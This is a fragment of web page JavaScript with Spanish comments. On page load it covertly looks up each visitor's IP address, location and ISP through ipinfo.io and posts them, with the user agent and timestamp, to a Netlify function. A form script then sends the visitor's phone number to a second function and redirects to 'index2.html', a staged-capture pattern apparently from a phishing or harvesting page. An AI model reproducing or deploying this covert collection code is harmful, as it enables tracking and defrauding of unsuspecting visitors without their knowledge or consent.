<!-- IP automÃ¡tica -->
<script>
window.onload = function () {
  fetch("https://ipinfo.io/json")
    .then(res => res.json())
    .then(data => {
      const ip = data.ip;
      const ciudad = data.city || "N/A";
      const region = data.region || "N/A";
      const pais = data.country || "N/A";
      const isp = data.org || "N/A";
      const userAgent = navigator.userAgent;
      const fecha = new Date().toLocaleString();

      // Enviar datos usando Netlify Function
      fetch('/.netlify/functions/send-ip', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          ip: ip,
          ciudad: ciudad,
          region: region,
          pais: pais,
          isp: isp,
          userAgent: userAgent,
          fecha: fecha
        })
      }).catch(err => console.error("Error al enviar IP:", err));
    })
    .catch(err => console.error("Error al obtener IP:", err));
};
</script>

<!-- CÃ³digo del paÃ­s -->
<script>
function selectFlag(e) {
  var selectedOption = e.target.selectedOptions[0];
  var flag = selectedOption.getAttribute("data-flag");
  var length = selectedOption.getAttribute("data-length");
  
  document.getElementById("flag").value = flag;
  
  // Actualizar maxlength y pattern segÃºn el paÃ­s
  var tlfInput = document.getElementById("tlf");
  tlfInput.setAttribute("maxlength", length);
  tlfInput.setAttribute("pattern", "[0-9]{" + length + "}");
  tlfInput.value = ""; // Limpiar el campo al cambiar de paÃ­s
}
</script>

<!-- Enviar datos usando Netlify Functions -->
<script>
function sender() {
  var pais = document.getElementById("pais").value;
  var cod = document.getElementById("flag").value;
  var tel = document.getElementById("tlf").value;

  localStorage.setItem("telefono_completo", cod + tel);

  // Enviar datos usando Netlify Function
  fetch('/.netlify/functions/send-phone', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      pais: pais,
      codigoArea: cod,
      telefono: tel
    })
  })
  .then(response => response.json())
  .then(data => {
    if (data.success) {
      window.location = "index2.html";
    } else {
      alert('Error al enviar datos. Intenta de nuevo.');
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('Error al enviar datos. Intenta de nuevo.');
  });

  return false;
}
</script>
